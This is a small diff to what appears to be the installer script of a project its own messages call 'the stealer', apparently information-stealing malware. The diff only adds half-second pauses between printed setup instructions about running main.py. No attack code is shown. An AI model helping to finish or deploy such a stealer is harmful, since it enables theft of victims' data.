@@ -94,7 +94,11 @@ except PermissionError:
 
 
 print('you all done')
+time.sleep(0.5)
 print('for using the software just run main.py and software start woking')
+time.sleep(0.5)
 print('you can also delet the git clone version of the stealer its no longer use')
+time.sleep(0.5)
 print('you can move main.py to whenver u want just dont delete the main.py')
+time.sleep(0.5)
 nothing=input()
